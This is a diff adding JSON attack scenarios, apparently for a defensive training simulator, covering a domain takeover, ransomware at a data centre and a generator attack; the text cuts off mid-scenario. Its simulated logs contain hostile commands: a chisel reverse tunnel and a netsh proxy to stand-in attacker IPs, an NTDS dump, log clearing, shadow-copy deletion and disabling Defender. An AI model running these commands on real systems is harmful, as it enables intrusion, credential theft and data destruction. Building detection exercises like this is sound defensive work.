@@ -1,0 +1,1622 @@
+[
+ {
+  "id": "domain-takeover",
+  "title": "Pengambilalihan direktori jaringan markas",
+  "brief": "Musuh mengeksploitasi server web yang terbuka, menaikkan hak akses, lalu berusaha menguasai Domain Controller. Pola skenario Red Team TNI di Keris Woomera 2026.",
+  "basis": [
+   "KW26",
+   "VOLT"
+  ],
+  "duration": 330,
+  "hosts": [
+   {
+    "id": "WEB-01",
+    "ip": "10.10.1.20",
+    "role": "Server web portal (IIS)",
+    "os": "Windows Server",
+    "seg": "IT"
+   },
+   {
+    "id": "WS-01",
+    "ip": "10.10.2.31",
+    "role": "Workstation staf",
+    "os": "Windows 10",
+    "seg": "IT"
+   },
+   {
+    "id": "FS-01",
+    "ip": "10.10.1.30",
+    "role": "File server",
+    "os": "Windows Server",
+    "seg": "IT"
+   },
+   {
+    "id": "DC-01",
+    "ip": "10.10.1.10",
+    "role": "Domain Controller",
+    "os": "Windows Server",
+    "seg": "IT"
+   }
+  ],
+  "outside": [
+   {
+    "id": "203.0.113.45",
+    "role": "Pemindai musuh"
+   },
+   {
+    "id": "198.51.100.23",
+    "role": "Server proksi musuh"
+   }
+  ],
+  "start": {
+   "on": [],
+   "creds": []
+  },
+  "objectives": [
+   {
+    "id": "O1",
+    "text": "Deteksi aktivitas awal dalam 120 detik",
+    "kind": "detect",
+    "within": 120
+   },
+   {
+    "id": "O2",
+    "text": "Cegah pencurian kredensial",
+    "kind": "prevent",
+    "techs": [
+     "T1003.001",
+     "T1003.002"
+    ]
+   },
+   {
+    "id": "O3",
+    "text": "Cegah musuh masuk ke Domain Controller",
+    "kind": "deny",
+    "host": "DC-01"
+   },
+   {
+    "id": "O4",
+    "text": "Cegah pencurian basis data akun domain (NTDS)",
+    "kind": "prevent",
+    "techs": [
+     "T1003.003",
+     "T1003.006"
+    ]
+   }
+  ],
+  "phases": [
+   {
+    "key": "akses",
+    "goal": "masuk lewat server web",
+    "t": 10,
+    "options": [
+     {
+      "id": "webshell",
+      "tech": "T1505.003",
+      "tactic": "Persistence",
+      "from": "203.0.113.45",
+      "host": "WEB-01",
+      "src": [
+       "VOLT",
+       "KW26"
+      ],
+      "name": "Celah aplikasi web dieksploitasi, web shell ditanam di WEB-01",
+      "note": "Volt Typhoon: T1190 dan web shell iisstart.aspx (ATT&CK G1017)",
+      "needs": [
+       "reach:WEB-01",
+       "ip:203.0.113.45"
+      ],
+      "fx": {
+       "on": [
+        "WEB-01"
+       ],
+       "creds": [],
+       "c2": null,
+       "ot": null
+      },
+      "think": "Portal markas punya celah. Web shell saya tertanam di WEB-01.",
+      "logs": [
+       {
+        "src": "Sysmon",
+        "id": 11,
+        "host": "WEB-01",
+        "f": {
+         "Image": "C:\\Windows\\System32\\inetsrv\\w3wp.exe",
+         "TargetFilename": "C:\\inetpub\\wwwroot\\portal\\iisstart.aspx"
+        }
+       },
+       {
+        "src": "Sysmon",
+        "id": 1,
+        "host": "WEB-01",
+        "f": {
+         "ParentImage": "C:\\Windows\\System32\\inetsrv\\w3wp.exe",
+         "Image": "C:\\Windows\\System32\\cmd.exe",
+         "CommandLine": "cmd.exe /c whoami",
+         "User": "IIS APPPOOL\\portal"
+        }
+       }
+      ],
+      "prio": 1,
+      "gap": null
+     }
+    ],
+    "optional": false,
+    "c2": false
+   },
+   {
+    "key": "c2",
+    "goal": "membuka jalur kendali dari luar",
+    "t": 35,
+    "c2": true,
+    "options": [
+     {
+      "id": "portproxy",
+      "prio": 1,
+      "tech": "T1090.001",
+      "tactic": "Command and Control",
+      "from": "198.51.100.23",
+      "host": "WEB-01",
+      "src": [
+       "VOLT"
+      ],
+      "name": "Proksi internal dengan netsh portproxy ke 198.51.100.23",
+      "note": "Volt Typhoon memakai netsh port proxy (ATT&CK G1017, T1090.001)",
+      "needs": [
+       "on:WEB-01",
+       "ip:198.51.100.23"
+      ],
+      "fx": {
+       "on": [],
+       "creds": [],
+       "c2": "198.51.100.23",
+       "ot": null
+      },
+      "think": "Saya pakai netsh bawaan Windows untuk membuka proksi. Tidak ada alat asing yang perlu dipasang.",
+      "logs": [
+       {
+        "src": "Sysmon",
+        "id": 1,
+        "host": "WEB-01",
+        "f": {
+         "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+         "Image": "C:\\Windows\\System32\\netsh.exe",
+         "CommandLine": "netsh interface portproxy add v4tov4 listenport=8443 listenaddress=0.0.0.0 connectport=443 connectaddress=198.51.100.23",
+         "User": "IIS APPPOOL\\portal"
+        }
+       }
+      ],
+      "gap": null
+     },
+     {
+      "id": "tunnel",
+      "prio": 2,
+      "tech": "T1572",
+      "tactic": "Command and Control",
+      "from": "203.0.113.45",
+      "host": "WEB-01",
+      "src": [
+       "AIMX"
+      ],
+      "name": "Terowongan cadangan (Chisel) ke 203.0.113.45",
+      "note": "Chisel SOCKS proxy terdokumentasi di kampanye C0064 (ATT&CK T1572)",
+      "needs": [
+       "on:WEB-01",
+       "ip:203.0.113.45"
+      ],
+      "fx": {
+       "on": [],
+       "creds": [],
+       "c2": "203.0.113.45",
+       "ot": null
+      },
+      "think": "Proksi pertama diblokir. Saya buka terowongan cadangan lewat alamat pemindai saya.",
+      "logs": [
+       {
+        "src": "Sysmon",
+        "id": 1,
+        "host": "WEB-01",
+        "f": {
+         "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+         "Image": "C:\\Windows\\Temp\\chisel.exe",
+         "CommandLine": "chisel.exe client 203.0.113.45:443 R:socks",
+         "User": "IIS APPPOOL\\portal"
+        }
+       }
+      ],
+      "gap": null
+     }
+    ],
+    "optional": false
+   },
+   {
+    "key": "intai",
+    "goal": "memetakan grup admin domain",
+    "t": 70,
+    "options": [
+     {
+      "id": "recon",
+      "tech": "T1069.002",
+      "tactic": "Discovery",
+      "from": "WEB-01",
+      "host": "WEB-01",
+      "src": [
+       "VOLT"
+      ],
+      "name": "Enumerasi grup Domain Admins dari web shell",
+      "note": "Volt Typhoon memakai utilitas bawaan untuk penemuan grup dan pengguna (ATT&CK G1017, T1069)",
+      "needs": [
+       "on:WEB-01",
+       "c2"
+      ],
+      "fx": {
+       "on": [],
+       "creds": [],
+       "c2": null,
+       "ot": null
+      },
+      "think": "Akun admin.server ada di grup Domain Admins. Akun itu yang saya incar.",
+      "logs": [
+       {
+        "src": "Sysmon",
+        "id": 1,
+        "host": "WEB-01",
+        "f": {
+         "ParentImage": "C:\\Windows\\System32\\inetsrv\\w3wp.exe",
+         "Image": "C:\\Windows\\System32\\net.exe",
+         "CommandLine": "net group \"domain admins\" /domain",
+         "User": "IIS APPPOOL\\portal"
+        }
+       }
+      ],
+      "prio": 1,
+      "gap": null
+     }
+    ],
+    "optional": false,
+    "c2": false
+   },
+   {
+    "key": "kred",
+    "goal": "mencuri kredensial",
+    "t": 110,
+    "options": [
+     {
+      "id": "lsass",
+      "prio": 1,
+      "tech": "T1003.001",
+      "tactic": "Credential Access",
+      "from": "WEB-01",
+      "host": "WEB-01",
+      "src": [
+       "VOLT",
+       "KW26"
+      ],
+      "name": "Akses memori LSASS di WEB-01",
+      "note": "Volt Typhoon mencoba mengakses hash di memori LSASS (ATT&CK G1017, T1003.001)",
+      "needs": [
+       "on:WEB-01",
+       "c2"
+      ],
+      "fx": {
+       "on": [],
+       "creds": [
+        "admin.server",
+        "svc.backup"
+       ],
+       "c2": null,
+       "ot": null
+      },
+      "think": "Memori LSASS memberi saya hash admin.server dan svc.backup. Dua kunci.",
+      "logs": [
+       {
+        "src": "Sysmon",
+        "id": 10,
+        "host": "WEB-01",
+        "f": {
+         "SourceImage": "C:\\Windows\\Temp\\WmiPrvSE.exe",
+         "TargetImage": "C:\\Windows\\System32\\lsass.exe",
+         "GrantedAccess": "0x1438",
+         "CallTrace": "C:\\Windows\\SYSTEM32\\ntdll.dll+9d4c4|C:\\Windows\\System32\\KERNELBASE.dll+2c13e"
+        }
+       }
+      ],
+      "gap": null
+     }
+    ],
+    "optional": false,
+    "c2": false
+   },
+   {
+    "key": "geser",
+    "goal": "bergerak ke dalam jaringan",
+    "t": 150,
+    "optional": true,
+    "options": [
+     {
+      "id": "psexec",
+      "prio": 1,
+      "tech": "T1569.002",
+      "tactic": "Execution",
+      "from": "WEB-01",
+      "host": "FS-01",
+      "src": [
+       "LB3"
+      ],
+      "name": "PsExec ke FS-01 dengan akun admin.server",
+      "note": "PsExec untuk eksekusi jarak jauh (ATT&CK S1202 LockBit 3.0, T1569.002)",
+      "needs": [
+       "on:WEB-01",
+       "c2",
+       "reach:FS-01",
+       "cred:admin.server"
+      ],
+      "fx": {
+       "on": [
+        "FS-01"
+       ],
+       "creds": [],
+       "c2": null,
+       "ot": null
+      },
+      "think": "Masuk ke file server sebagai admin.server.",
+      "logs": [
+       {
+        "src": "Security",
+        "id": 5140,
+        "host": "FS-01",
+        "f": {
+         "ShareName": "\\\\*\\ADMIN$",
+         "IpAddress": "10.10.1.20",
+         "SubjectUserName": "admin.server"
+        }
+       },
+       {
+        "src": "Sysmon",
+        "id": 1,
+        "host": "FS-01",
+        "f": {
+         "Image": "C:\\Windows\\PSEXESVC.exe",
+         "ParentImage": "C:\\Windows\\System32\\services.exe",
+         "User": "NT AUTHORITY\\SYSTEM"
+        }
+       }
+      ],
+      "gap": null
+     },
+     {
+      "id": "pth",
+      "prio": 1,
+      "tech": "T1021.002",
+      "tactic": "Lateral Movement",
+      "from": "WEB-01",
+      "host": "FS-01",
+      "src": [
+       "LB3"
+      ],
+      "name": "SMB ke FS-01 dengan hash svc.backup",
+      "note": "SMB/Admin Shares untuk gerak lateral (ATT&CK S1202 LockBit 3.0, T1021.002)",
+      "needs": [
+       "on:WEB-01",
+       "c2",
+       "reach:FS-01",
+       "cred:svc.backup"
+      ],
+      "fx": {
+       "on": [
+        "FS-01"
+       ],
+       "creds": [],
+       "c2": null,
+       "ot": null
+      },
+      "think": "Hash akun layanan svc.backup cukup untuk masuk ke FS-01 tanpa tahu kata sandinya.",
+      "logs": [
+       {
+        "src": "Security",
+        "id": 4624,
+        "host": "FS-01",
+        "f": {
+         "LogonType": 3,
+         "LogonProcessName": "NtLmSsp",
+         "KeyLength": 0,
+         "SubjectUserSid": "S-1-0-0",
+         "TargetUserName": "svc.backup",
+         "IpAddress": "10.10.1.20"
+        }
+       }
+      ],
+      "gap": null
+     }
+    ],
+    "c2": false
+   },
+   {
+    "key": "dc",
+    "goal": "menguasai Domain Controller",
+    "t": 190,
+    "optional": true,
+    "options": [
+     {
+      "id": "rdp-dc",
+      "prio": 1,
+      "tech": "T1021.001",
+      "tactic": "Lateral Movement",
+      "from": "FS-01",
+      "host": "DC-01",
+      "src": [
+       "VOLT",
+       "KW26"
+      ],
+      "name": "RDP ke DC-01 dengan akun admin domain",
+      "note": "Volt Typhoon bergerak ke Domain Controller lewat RDP dengan akun admin domain (ATT&CK G1017, T1021.001)",
+      "needs": [
+       "on:FS-01",
+       "reach:DC-01",
+       "cred:admin.server"
+      ],
+      "fx": {
+       "on": [
+        "DC-01"
+       ],
+       "creds": [],
+       "c2": null,
+       "ot": null
+      },
+      "think": "RDP ke Domain Controller berhasil. Direktori jaringan markas di tangan saya.",
+      "logs": [
+       {
+        "src": "Security",
+        "id": 4624,
+        "host": "DC-01",
+        "f": {
+         "LogonType": 10,
+         "AuthenticationPackageName": "Negotiate",
+         "TargetUserName": "admin.server",
+         "IpAddress": "10.10.1.30"
+        }
+       }
+      ],
+      "gap": null
+     }
+    ],
+    "c2": false
+   },
+   {
+    "key": "ntds",
+    "goal": "mencuri basis data akun domain",
+    "t": 225,
+    "options": [
+     {
+      "id": "ntdsutil",
+      "prio": 1,
+      "tech": "T1003.003",
+      "tactic": "Credential Access",
+      "from": "DC-01",
+      "host": "DC-01",
+      "src": [
+       "VOLT",
+       "KW26"
+      ],
+      "name": "ntdsutil membuat salinan ntds.dit di DC-01",
+      "note": "Volt Typhoon memakai ntdsutil untuk mengambil hash akun domain (ATT&CK G1017, T1003.003)",
+      "needs": [
+       "on:DC-01"
+      ],
+      "fx": {
+       "on": [],
+       "creds": [
+        "krbtgt"
+       ],
+       "c2": null,
+       "ot": null
+      },
+      "think": "Seluruh hash akun domain tersalin. Setiap akun di markas ini kini milik saya.",
+      "logs": [
+       {
+        "src": "Sysmon",
+        "id": 1,
+        "host": "DC-01",
+        "f": {
+         "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+         "Image": "C:\\Windows\\System32\\ntdsutil.exe",
+         "CommandLine": "ntdsutil \"ac i ntds\" \"ifm\" \"create full C:\\Windows\\Temp\\pro\" q q",
+         "User": "LATIH\\admin.server"
+        }
+       }
+      ],
+      "gap": null
+     },
+     {
+      "id": "dcsync",
+      "prio": 2,
+      "tech": "T1003.006",
+      "tactic": "Credential Access",
+      "from": "WEB-01",
+      "host": "DC-01",
+      "src": [
+       "AIMX"
+      ],
+      "name": "DCSync dari WEB-01 dengan hak replikasi svc.backup",
+      "note": "DCSync terdokumentasi di kampanye C0064 (ATT&CK T1003.006)",
+      "needs": [
+       "on:WEB-01",
+       "c2",
+       "reach:DC-01",
+       "cred:svc.backup"
+      ],
+      "fx": {
+       "on": [],
+       "creds": [
+        "krbtgt"
+       ],
+       "c2": null,
+       "ot": null
+      },
+      "think": "Saya tidak bisa masuk ke DC, tetapi svc.backup punya hak replikasi. Saya minta DC menyerahkan semua hash lewat DCSync.",
+      "logs": [
+       {
+        "src": "Security",
+        "id": 4662,
+        "host": "DC-01",
+        "f": {
+         "SubjectUserName": "svc.backup",
+         "Properties": "{1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}",
+         "ObjectServer": "DS"
+        }
+       }
+      ],
+      "gap": null
+     }
+    ],
+    "optional": false,
+    "c2": false
+   },
+   {
+    "key": "jejak",
+    "goal": "menghapus jejak",
+    "t": 255,
+    "options": [
+     {
+      "id": "wevtutil",
+      "tech": "T1685.005",
+      "tactic": "Defense Evasion",
+      "from": "WEB-01",
+      "host": "WEB-01",
+      "src": [
+       "VOLT"
+      ],
+      "name": "Menghapus log Security di WEB-01",
+      "note": "Volt Typhoon menghapus Windows Event Log secara selektif (ATT&CK G1017, T1685.005)",
+      "needs": [
+       "on:WEB-01"
+      ],
+      "fx": {
+       "on": [],
+       "creds": [],
+       "c2": null,
+       "ot": null
+      },
+      "think": "Log Security di WEB-01 saya bersihkan. Penyelidik akan kesulitan menyusun ulang kejadian.",
+      "logs": [
+       {
+        "src": "Sysmon",
+        "id": 1,
+        "host": "WEB-01",
+        "f": {
+         "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+         "Image": "C:\\Windows\\System32\\wevtutil.exe",
+         "CommandLine": "wevtutil cl Security",
+         "User": "IIS APPPOOL\\portal"
+        }
+       }
+      ],
+      "prio": 1,
+      "gap": null
+     }
+    ],
+    "optional": false,
+    "c2": false
+   }
+  ]
+ },
+ {
+  "id": "ransomware-pusdat",
+  "title": "Ransomware di pusat data satuan",
+  "brief": "Musuh yang sudah memegang akun admin mematikan antivirus, menghentikan layanan cadangan, lalu mengenkripsi server. Urutan kejadian mengikuti analisis forensik BSSN atas PDNS 2 (Juni 2024). Titik masuk awal tidak dipublikasikan BSSN, jadi skenario dimulai dari akun admin yang sudah dicuri.",
+  "basis": [
+   "PDNS",
+   "LB3"
+  ],
+  "duration": 300,
+  "hosts": [
+   {
+    "id": "JUMP-01",
+    "ip": "10.20.1.5",
+    "role": "Server akses jarak jauh admin",
+    "os": "Windows Server",
+    "seg": "IT"
+   },
+   {
+    "id": "HV-01",
+    "ip": "10.20.1.11",
+    "role": "Host virtualisasi (Hyper-V)",
+    "os": "Windows Server",
+    "seg": "IT"
+   },
+   {
+    "id": "BAK-01",
+    "ip": "10.20.1.12",
+    "role": "Server cadangan",
+    "os": "Windows Server",
+    "seg": "IT"
+   },
+   {
+    "id": "DB-01",
+    "ip": "10.20.1.13",
+    "role": "Server basis data layanan",
+    "os": "Windows Server",
+    "seg": "IT"
+   }
+  ],
+  "outside": [
+   {
+    "id": "192.0.2.77",
+    "role": "Server kendali musuh"
+   },
+   {
+    "id": "198.51.100.140",
+    "role": "Server kendali cadangan"
+   }
+  ],
+  "start": {
+   "on": [
+    "JUMP-01"
+   ],
+   "creds": [
+    "adm.pusdat",
+    "localadmin"
+   ]
+  },
+  "objectives": [
+   {
+    "id": "O1",
+    "text": "Deteksi pelemahan antivirus dalam 90 detik",
+    "kind": "detect",
+    "within": 90
+   },
+   {
+    "id": "O2",
+    "text": "Cegah penghapusan shadow copy di server cadangan",
+    "kind": "prevent",
+    "techs": [
+     "T1490"
+    ],
+    "host": "BAK-01"
+   },
+   {
+    "id": "O3",
+    "text": "Cegah enkripsi host virtualisasi",
+    "kind": "prevent",
+    "techs": [
+     "T1486"
+    ],
+    "host": "HV-01"
+   }
+  ],
+  "phases": [
+   {
+    "key": "c2",
+    "goal": "menghubungi server kendali",
+    "t": 10,
+    "c2": true,
+    "options": [
+     {
+      "id": "c2-a",
+      "prio": 1,
+      "tech": "T1071.001",
+      "tactic": "Command and Control",
+      "from": "192.0.2.77",
+      "host": "JUMP-01",
+      "src": [
+       "LB3"
+      ],
+      "name": "Beacon HTTP terenkripsi ke 192.0.2.77",
+      "note": "LockBit 3.0 mengirim info korban lewat HTTP; komunikasi C2 dienkripsi AES dan base64 (ATT&CK S1202)",
+      "needs": [
+       "on:JUMP-01",
+       "ip:192.0.2.77"
+      ],
+      "fx": {
+       "on": [],
+       "creds": [],
+       "c2": "192.0.2.77",
+       "ot": null
+      },
+      "think": "Saya masuk dengan akun admin yang sah. Kanal kendali terenkripsi hidup.",
+      "logs": [
+       {
+        "src": "Zeek",
+        "id": "conn",
+        "host": "JUMP-01",
+        "f": {
+         "id.orig_h": "10.20.1.5",
+         "id.resp_h": "192.0.2.77",
+         "id.resp_p": 443,
+         "service": "ssl",
+         "duration": 2.1
+        }
+       }
+      ],
+      "gap": "Koneksi HTTPS terenkripsi dari server admin ke internet tidak cocok dengan aturan SigmaHQ mana pun di MUSUH. Celah deteksi yang disengaja: peserta harus menemukannya dari daftar koneksi atau setelah tanda berikutnya."
+     },
+     {
+      "id": "c2-b",
+      "prio": 2,
+      "tech": "T1071.001",
+      "tactic": "Command and Control",
+      "from": "198.51.100.140",
+      "host": "JUMP-01",
+      "src": [
+       "LB3"
+      ],
+      "name": "Beacon cadangan ke 198.51.100.140",
+      "note": "Kanal kendali cadangan (ATT&CK S1202, T1071.001)",
+      "needs": [
+       "on:JUMP-01",
+       "ip:198.51.100.140"
+      ],
+      "fx": {
+       "on": [],
+       "creds": [],
+       "c2": "198.51.100.140",
+       "ot": null
+      },
+      "think": "Kanal utama diblokir. Pindah ke server kendali cadangan.",
+      "logs": [
+       {
+        "src": "Zeek",
+        "id": "conn",
+        "host": "JUMP-01",
+        "f": {
+         "id.orig_h": "10.20.1.5",
+         "id.resp_h": "198.51.100.140",
+         "id.resp_p": 443,
+         "service": "ssl",
+         "duration": 1.7
+        }
+       }
+      ],
+      "gap": "Koneksi HTTPS terenkripsi dari server admin ke internet tidak cocok dengan aturan SigmaHQ mana pun di MUSUH. Celah deteksi yang disengaja: peserta harus menemukannya dari daftar koneksi atau setelah tanda berikutnya."
+     }
+    ],
+    "optional": false
+   },
+   {
+    "key": "geser",
+    "goal": "menjangkau server pusat data",
+    "t": 45,
+    "options": [
+     {
+      "id": "psexec",
+      "prio": 1,
+      "tech": "T1569.002",
+      "tactic": "Execution",
+      "from": "JUMP-01",
+      "host": "HV-01",
+      "src": [
+       "LB3"
+      ],
+      "name": "PsExec dengan adm.pusdat ke HV-01, BAK-01, DB-01",
+      "note": "LockBit 3.0 memakai PsExec untuk menjalankan perintah dan muatan (ATT&CK S1202, T1569.002)",
+      "needs": [
+       "on:JUMP-01",
+       "c2",
+       "reach:HV-01",
+       "cred:adm.pusdat"
+      ],
+      "fx": {
+       "on": [
+        "HV-01",
+        "BAK-01",
+        "DB-01"
+       ],
+       "creds": [],
+       "c2": null,
+       "ot": null
+      },
+      "think": "Dengan akun admin, PsExec membuka jalan ke host virtualisasi, server cadangan dan basis data.",
+      "logs": [
+       {
+        "src": "Security",
+        "id": 5140,
+        "host": "HV-01",
+        "f": {
+         "ShareName": "\\\\*\\ADMIN$",
+         "IpAddress": "10.20.1.5",
+         "SubjectUserName": "adm.pusdat"
+        }
+       },
+       {
+        "src": "Sysmon",
+        "id": 1,
+        "host": "HV-01",
+        "f": {
+         "Image": "C:\\Windows\\PSEXESVC.exe",
+         "ParentImage": "C:\\Windows\\System32\\services.exe",
+         "User": "NT AUTHORITY\\SYSTEM"
+        }
+       }
+      ],
+      "gap": null
+     },
+     {
+      "id": "local",
+      "prio": 2,
+      "tech": "T1078.003",
+      "tactic": "Lateral Movement",
+      "from": "JUMP-01",
+      "host": "HV-01",
+      "src": [
+       "LB3"
+      ],
+      "name": "Akun lokal localadmin dipakai ke HV-01, BAK-01, DB-01",
+      "note": "LockBit 3.0 memakai akun lokal yang dibobol untuk gerak lateral (ATT&CK S1202, T1078.003)",
+      "needs": [
+       "on:JUMP-01",
+       "c2",
+       "reach:HV-01",
+       "cred:localadmin"
+      ],
+      "fx": {
+       "on": [
+        "HV-01",
+        "BAK-01",
+        "DB-01"
+       ],
+       "creds": [],
+       "c2": null,
+       "ot": null
+      },
+      "think": "Akun admin domain direset. Kata sandi akun lokal yang sama di semua server masih berlaku.",
+      "logs": [
+       {
+        "src": "Security",
+        "id": 4624,
+        "host": "HV-01",
+        "f": {
+         "LogonType": 3,
+         "LogonProcessName": "NtLmSsp",
+         "KeyLength": 0,
+         "SubjectUserSid": "S-1-0-0",
+         "TargetUserName": "localadmin",
+         "IpAddress": "10.20.1.5"
+        }
+       }
+      ],
+      "gap": null
+     }
+    ],
+    "optional": false,
+    "c2": false
+   },
+   {
+    "key": "av",
+    "goal": "mematikan antivirus",
+    "t": 80,
+    "options": [
+     {
+      "id": "defender",
+      "tech": "T1685",
+      "tactic": "Defense Evasion",
+      "from": "HV-01",
+      "host": "HV-01",
+      "src": [
+       "PDNS",
+       "LB3"
+      ],
+      "name": "Windows Defender dimatikan di HV-01",
+      "note": "BSSN: upaya menonaktifkan Windows Defender sejak 17 Juni 2024 23.15 WIB. LockBit 3.0 dapat mematikan Defender (ATT&CK S1202, T1685)",
+      "needs": [
+       "on:HV-01"
+      ],
+      "fx": {
+       "on": [],
+       "creds": [],
+       "c2": null,
+       "ot": null
+      },
+      "think": "Antivirus di host virtualisasi saya lumpuhkan dulu. Begitu juga urutannya di PDNS 2.",
+      "logs": [
+       {
+        "src": "PowerShell",
+        "id": 400,
+        "host": "HV-01",
+        "f": {
+         "Data": "HostApplication=powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true"
+        }
+       },
+       {
+        "src": "System",
+        "id": 7036,
+        "host": "HV-01",
+        "f": {
+         "Provider_Name": "Service Control Manager",
+         "param1": "Windows Defender Antivirus Service",
+         "param2": "stopped"
+        }
+       }
+      ],
+      "prio": 1,
+      "gap": null
+     }
+    ],
+    "optional": false,
+    "c2": false
+   },
+   {
+    "key": "layanan",
+    "goal": "menghentikan layanan cadangan dan basis data",
+    "t": 130,
+    "options": [
+     {
+      "id": "svcstop",
+      "tech": "T1489",
+      "tactic": "Impact",
+      "from": "BAK-01",
+      "host": "BAK-01",
+      "src": [
+       "PDNS",
+       "LB3"
+      ],
+      "name": "Layanan cadangan dan basis data dihentikan",
+      "note": "BSSN: menonaktifkan service yang berjalan; VSS, HyperV Volume, VirtualDisk dan Veeam dinonaktifkan. LockBit 3.0 menghentikan layanan cadangan dan basis data (ATT&CK S1202, T1489)",
+      "needs": [
+       "on:BAK-01"
+      ],
+      "fx": {
+       "on": [],
+       "creds": [],
+       "c2": null,
+       "ot": null
+      },
+      "think": "Layanan cadangan dan basis data saya hentikan agar berkas tidak terkunci saat dienkripsi.",
+      "logs": [
+       {
+        "src": "Sysmon",
+        "id": 1,
+        "host": "BAK-01",
+        "f": {
+         "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+         "Image": "C:\\Windows\\System32\\net.exe",
+         "CommandLine": "net stop \"Veeam Backup Service\" /y",
+         "User": "NT AUTHORITY\\SYSTEM"
+        }
+       },
+       {
+        "src": "Sysmon",
+        "id": 1,
+        "host": "DB-01",
+        "f": {
+         "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+         "Image": "C:\\Windows\\System32\\net.exe",
+         "CommandLine": "net stop MSSQLSERVER /y",
+         "User": "NT AUTHORITY\\SYSTEM"
+        }
+       }
+      ],
+      "prio": 1,
+      "gap": null
+     }
+    ],
+    "optional": false,
+    "c2": false
+   },
+   {
+    "key": "shadow",
+    "goal": "menghapus salinan pemulihan",
+    "t": 165,
+    "options": [
+     {
+      "id": "vss",
+      "tech": "T1490",
+      "tactic": "Impact",
+      "from": "BAK-01",
+      "host": "BAK-01",
+      "src": [
+       "PDNS",
+       "LB3"
+      ],
+      "name": "Shadow copy di BAK-01 dihapus",
+      "note": "BSSN: VSS dinonaktifkan. LockBit 3.0 menghapus volume shadow copy (ATT&CK S1202, T1490)",
+      "needs": [
+       "on:BAK-01"
+      ],
+      "fx": {
+       "on": [],
+       "creds": [],
+       "c2": null,
+       "ot": null
+      },
+      "think": "Salinan pemulihan di server cadangan terhapus. Satuan ini tidak bisa memulihkan dari cadangan lokal.",
+      "logs": [
+       {
+        "src": "Sysmon",
+        "id": 1,
+        "host": "BAK-01",
+        "f": {
+         "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+         "Image": "C:\\Windows\\System32\\vssadmin.exe",
+         "CommandLine": "vssadmin.exe delete shadows /all /quiet",
+         "User": "NT AUTHORITY\\SYSTEM"
+        }
+       }
+      ],
+      "prio": 1,
+      "gap": null
+     }
+    ],
+    "optional": false,
+    "c2": false
+   },
+   {
+    "key": "enkripsi",
+    "goal": "mengenkripsi server",
+    "t": 205,
+    "options": [
+     {
+      "id": "enc-hv",
+      "prio": 1,
+      "tech": "T1486",
+      "tactic": "Impact",
+      "from": "HV-01",
+      "host": "HV-01",
+      "src": [
+       "PDNS",
+       "LB3"
+      ],
+      "name": "Disk mesin virtual di HV-01 dienkripsi",
+      "note": "BSSN: PDNS 2 lumpuh, 282 tenant terdampak. LockBit 3.0 mengenkripsi data dengan AES-256/ChaCha20/RSA-2048 (ATT&CK S1202, T1486)",
+      "needs": [
+       "on:HV-01"
+      ],
+      "fx": {
+       "on": [],
+       "creds": [],
+       "c2": null,
+       "ot": null
+      },
+      "think": "Disk mesin virtual di HV-01 terenkripsi. Semua layanan yang berjalan di atasnya ikut mati.",
+      "logs": [
+       {
+        "src": "FileRename",
+        "id": 2,
+        "host": "HV-01",
+        "f": {
+         "SourceFilename": "D:\\VM\\layanan-personel\\data.xlsx",
+         "TargetFilename": "D:\\VM\\layanan-personel\\data.xlsx.Wc8xZ1",
+         "Image": "C:\\Windows\\Temp\\svc.exe"
+        }
+       }
+      ],
+      "gap": null
+     },
+     {
+      "id": "enc-db",
+      "prio": 2,
+      "tech": "T1486",
+      "tactic": "Impact",
+      "from": "DB-01",
+      "host": "DB-01",
+      "src": [
+       "LB3"
+      ],
+      "name": "Berkas di DB-01 dienkripsi",
+      "note": "ATT&CK S1202, T1486",
+      "needs": [
+       "on:DB-01"
+      ],
+      "fx": {
+       "on": [],
+       "creds": [],
+       "c2": null,
+       "ot": null
+      },
+      "think": "HV-01 tertutup. Saya enkripsi apa yang bisa saya jangkau di server basis data.",
+      "logs": [
+       {
+        "src": "FileRename",
+        "id": 2,
+        "host": "DB-01",
+        "f": {
+         "SourceFilename": "E:\\EXPORT\\rekap.xlsx",
+         "TargetFilename": "E:\\EXPORT\\rekap.xlsx.Wc8xZ1",
+         "Image": "C:\\Windows\\Temp\\svc.exe"
+        }
+       }
+      ],
+      "gap": null
+     }
+    ],
+    "optional": false,
+    "c2": false
+   }
+  ]
+ },
+ {
+  "id": "listrik-markas",
+  "title": "Serangan ke pasokan listrik markas",
+  "brief": "Musuh masuk lewat lampiran surel, mencuri kredensial, menyeberang ke jaringan kendali genset, lalu mematikan genset. Rantai mengikuti serangan jaringan listrik Ukraina 2015 dan FrostyGoop 2024.",
+  "basis": [
+   "UA15",
+   "FGP"
+  ],
+  "duration": 360,
+  "hosts": [
+   {
+    "id": "WS-01",
+    "ip": "10.30.2.15",
+    "role": "Workstation staf logistik",
+    "os": "Windows 10",
+    "seg": "IT"
+   },
+   {
+    "id": "VPN-01",
+    "ip": "10.30.1.2",
+    "role": "Gerbang VPN ke jaringan kendali",
+    "os": "Appliance",
+    "seg": "IT"
+   },
+   {
+    "id": "HMI-01",
+    "ip": "10.30.9.10",
+    "role": "HMI operator genset",
+    "os": "Windows 10",
+    "seg": "OT"
+   },
+   {
+    "id": "PLC-GEN",
+    "ip": "10.30.9.20",
+    "role": "Pengendali genset (Modbus/TCP)",
+    "os": "Firmware",
+    "seg": "OT"
+   }
+  ],
+  "outside": [
+   {
+    "id": "INET",
+    "role": "Surel masuk"
+   },
+   {
+    "id": "192.0.2.150",
+    "role": "Server kendali musuh"
+   },
+   {
+    "id": "203.0.113.9",
+    "role": "Server kendali cadangan"
+   }
+  ],
+  "start": {
+   "on": [],
+   "creds": []
+  },
+  "objectives": [
+   {
+    "id": "O1",
+    "text": "Deteksi aktivitas awal dalam 120 detik",
+    "kind": "detect",
+    "within": 120
+   },
+   {
+    "id": "O2",
+    "text": "Cegah musuh menyeberang ke jaringan kendali genset",
+    "kind": "deny",
+    "host": "HMI-01"
+   },
+   {
+    "id": "O3",
+    "text": "Genset tidak berhenti, atau pulih dalam 60 detik",
+    "kind": "ot",
+    "within": 60
+   }
+  ],
+  "phases": [
+   {
+    "key": "akses",
+    "goal": "masuk lewat lampiran surel",
+    "t": 10,
+    "options": [
+     {
+      "id": "phish",
